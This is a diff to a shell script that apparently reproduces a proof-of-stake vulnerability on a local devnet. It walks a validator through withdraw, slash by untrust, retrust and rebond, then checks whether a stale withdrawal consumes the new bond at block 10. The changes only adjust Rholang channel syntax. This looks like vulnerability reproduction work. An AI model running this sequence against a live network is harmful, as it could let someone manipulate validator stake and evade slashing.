@@ -106,23 +106,23 @@ done
 [[ "$ready" == true ]] || { cat "$evidence/genesis-ready.log"; exit 1; }
 
 # Ask the real node to derive validator 1's REV address, then fund that key through devnet faucet.
-submit address "$admin_priv" "revAddress!(\"fromPublicKey\", \"$target_pub\".hexToBytes(), *ret) | for (@addr <- ret) { @\"aria-address\"!(*addr) }"
+submit address "$admin_priv" "revAddress!(\"fromPublicKey\", \"$target_pub\".hexToBytes(), *ret) | for (@addr <- ret) { @\"aria-address\"!(addr) }"
 target_addr="$(sed -n 's/.*\(111[1-9A-HJ-NP-Za-km-z]\{20,\}\).*/\1/p' "$evidence/address-reply.txt" | head -1)"
 [[ -n "$target_addr" ]] || { cat "$evidence/address-reply.txt"; exit 1; }
 tools/devnet.sh faucet "$target_addr" > "$evidence/faucet.json"
 
 # The actual sequence: withdraw, slash via untrust, restore trust, then bond fresh stake.
-submit withdraw "$target_priv" 'pos!("withdraw", *deployerId, *ret) | for (@r <- ret) { @"aria-withdraw"!(*r) }'
+submit withdraw "$target_priv" 'pos!("withdraw", *deployerId, *ret) | for (@r <- ret) { @"aria-withdraw"!(r) }'
 grep -qi true "$evidence/withdraw-reply.txt"
-submit untrust "$admin_priv" "pos!(\"untrust\", *deployerId, \"$target_pub\".hexToBytes(), *ret) | for (@r <- ret) { @\"aria-untrust\"!(*r) }"
+submit untrust "$admin_priv" "pos!(\"untrust\", *deployerId, \"$target_pub\".hexToBytes(), *ret) | for (@r <- ret) { @\"aria-untrust\"!(r) }"
 grep -qi true "$evidence/untrust-reply.txt"
-submit retrust "$admin_priv" "pos!(\"trust\", *deployerId, \"$target_pub\".hexToBytes(), *ret) | for (@r <- ret) { @\"aria-retrust\"!(*r) }"
+submit retrust "$admin_priv" "pos!(\"trust\", *deployerId, \"$target_pub\".hexToBytes(), *ret) | for (@r <- ret) { @\"aria-retrust\"!(r) }"
 grep -qi true "$evidence/retrust-reply.txt"
-submit rebond "$target_priv" 'pos!("bond", *deployerId, 50, *ret) | for (@r <- ret) { @"aria-rebond"!(*r) }'
+submit rebond "$target_priv" 'pos!("bond", *deployerId, 50, *ret) | for (@r <- ret) { @"aria-rebond"!(r) }'
 grep -qi true "$evidence/rebond-reply.txt"
 
 # Confirm fresh stake is present before the boundary, then advance actual blocks to height 10.
-submit pool-before-boundary "$admin_priv" "pos!(\"getBonds\", *ret) | for (@b <- ret) { @\"aria-pool-before\"!(*b) }"
+submit pool-before-boundary "$admin_priv" "pos!(\"getBonds\", *ret) | for (@b <- ret) { @\"aria-pool-before\"!(b) }"
 grep -qi "$target_pub" "$evidence/pool-before-boundary-reply.txt"
 cat > examples/aria-attack.rho <<'RHO'
 Nil
@@ -132,7 +132,7 @@ advance_without_reply "$((10 - height))"
 
 # A fresh withdrawal claim at block 10 proves the old pending request survived slash and
 # consumed the replacement bond. If slash had cleared pending state, this validator remains bonded.
-submit pool-at-boundary "$admin_priv" "pos!(\"getBonds\", *ret) | for (@b <- ret) { @\"aria-pool-at-boundary\"!(*b) }"
+submit pool-at-boundary "$admin_priv" "pos!(\"getBonds\", *ret) | for (@b <- ret) { @\"aria-pool-at-boundary\"!(b) }"
 if grep -qi "$target_pub" "$evidence/pool-at-boundary-reply.txt"; then
   cat "$evidence/pool-at-boundary-reply.txt"
   echo 'FAIL: target remained bonded; stale withdrawal did not consume replacement bond' >&2
